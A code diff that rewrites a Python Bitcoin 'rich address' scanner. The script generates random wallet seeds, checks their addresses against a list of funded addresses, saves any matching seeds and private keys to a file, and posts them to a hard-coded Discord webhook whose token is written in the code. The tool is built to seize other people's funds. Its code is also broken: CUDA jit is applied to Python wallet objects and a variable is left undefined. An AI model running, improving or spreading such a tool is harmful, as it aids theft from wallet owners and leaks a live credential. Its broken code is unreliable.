@@ -1,80 +1,96 @@
+import requests
 from hdwallet import HDWallet
 from hdwallet.symbols import BTC as SYMBOL
-from colorama import Fore , Style , Back
-from hexer import mHash
-from datetime import datetime
-import threading
-import mnemonic
+from hdwallet.utils import generate_mnemonic
 from multiprocessing import Pool
+import multiprocessing
+from datetime import datetime
+from colorama import Fore , Style , Back
+from numba import jit
+import numpy as np
 
-def timer() :
+# Load file
+# wget https://github.com/Pymmdrza/Rich-Address-Wallet/releases/download/Bitcoin-Addr_Sep-2023/Just_All_P2PKH_Bitcoin_Addresses.txt.zip
+filename = 'btc.txt'
+with open(filename) as f:
+    addresses = set(f.read().split())
+print(f"Loaded {len(addresses)} addresses!")
+
+def message(title, message):
+    embered = {'title': message}
+    headers = {"Content-Type": "application/json"}
+    data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title),
+            'embeds': [embered]}
+    webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
+    requests.post(webhook_url, json=data, headers=headers)
+
+def timer():
     tcx = datetime.now().time()
     return tcx
 
-def generate_mnemonic():
-    mnemo = mnemonic.Mnemonic("english")
-    return mnemo.generate(strength=128)
-
-p2shp = """
-                                 ---***---
-
-           ███╗    ██████╗ ██████╗ ██████╗ ██╗  ██╗██╗  ██╗    ███╗
-           ██╔╝    ██╔══██╗╚════██╗██╔══██╗██║ ██╔╝██║  ██║    ╚██║
-           ██║     ██████╔╝ █████╔╝██████╔╝█████╔╝ ███████║     ██║
-           ██║     ██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═██╗ ██╔══██║     ██║
-           ███╗    ██║     ███████╗██║     ██║  ██╗██║  ██║    ███║
-           ╚══╝    ╚═╝     ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══╝
-
-                                 ---***---                                         
-        """
-
-print(p2shp)
-
-filename = 'P2PKH.txt'
-with open(filename) as f :
-    add = f.read().split()
-add = set(add)
-print('[*]All Address TYPE P2SH+P2WSH Start With 1 import Now...' , timer() , '\n')
-print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(M M D R Z A . C o M)~~~~~~~~~~~~~~~~~~~~~~~~~~\n')
-
 r = 1
 cores = 4
+threads = 500
 
-def seek(r) :
+print(f"Start With: {cores} CPU Threads \n")
+
+@jit(target="cuda")
+def generate_wallets():
+    wallets = {}
+
+    for r in range(threads):
+        seed = generate_mnemonic()
+        hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
+        hdwallet.from_mnemonic(mnemonic=seed)
+        priv = hdwallet.private_key()
+        addr = hdwallet.p2pkh_address()
+        wallets[addr] = {"seed": seed, "address": addr, "private_key": priv}
+
+    return wallets
+
+@jit(target="cuda")
+def search_address_in_list_gpu(addresses, keys):
+    matches = set()
+    for addr in keys:
+        if addr in addresses:
+            matches.add(addr)
+    return matches
+
+def seek(i):
     z = 0
     w = 0
-    while True :
+
+    while True:
         txx = timer()
-        seed = generate_mnemonic()
-        hdwallet: HDWallet = HDWallet(symbol = SYMBOL)
-        hdwallet.from_mnemonic(mnemonic = seed)
-        addr = hdwallet.p2pkh_address()
-        priv = hdwallet.private_key()
+        wallets = generate_wallets()
+        keys = set(wallets.keys())
+        matched = search_address_in_list_gpu(addresses, keys)
+        z += len(wallets)
 
-        print(Fore.GREEN , 'Total:' , Fore.YELLOW , str(z) , Fore.GREEN , 'Win:' , Fore.WHITE , str(w) , Fore.RED ,
-              str(seed) , Back.MAGENTA , Fore.WHITE , txx , Style.RESET_ALL ,
-              end = '\r')
-        z += 1
+        print(Fore.GREEN, f"[CPU{i}][C: {z} / W: {w}]")
 
-        if addr in add :
-            w += 1
-            print(Fore.WHITE , 'Winning Wallet On Database File Imported ... [LOADED]')
-            print(Fore.CYAN , 'All Details Saved On Text File Root Path ... [WRITED]')
-            f = open("winner.txt" , "a")
-            f.write('\n' , str(addr))
-            f.write('\n' , str(seed))
-            f.write('\n' , str(priv))
-            f.write('\n==========[PROGRAMMER BY MMDRZA.CoM]==========\n')
-            f.close()
-            print(Fore.MAGENTA , 'Information File Name ========> winner.txt [OK]')
-            continue
+        if len(matched) > 0:
+            for addr in matched:
+                ck = wallets.get(addr)
+                address = ck.get('address');
+                seed = ck.get('seed');
+                private_key = ck.get('private_key');
 
-
-seek(r)
+                w += 1
+                print(Fore.WHITE, 'Winning Wallet On Database File Imported ... [LOADED]')
+                print(Fore.CYAN, 'All Details Saved On Text File Root Path ... [WRITED]')
+                f = open("winner.txt", "a")
+                f.write('\n' + str(address))
+                f.write('\n' + str(seed))
+                f.write('\n' + str(private_key))
+                f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
+                f.close()
+                print(Fore.MAGENTA, 'Information File Name ========> winner.txt [OK]')
+                message('NEW BTC WALLET IS FOUND!',
+                        f"[{balance} BTC] \n Address: [{address}] \n Seed: [{seed}] \n Private: [{private_key}]")
+                continue
 
 if __name__ == '__main__':
-    jobs = []
-    for r in range(cores):
-        p = multiprocessing.Process(target=seek, args=(r,))
-        jobs.append(p)
+    for i in range(cores):
+        p = multiprocessing.Process(target=seek, args=(i,))
         p.start()
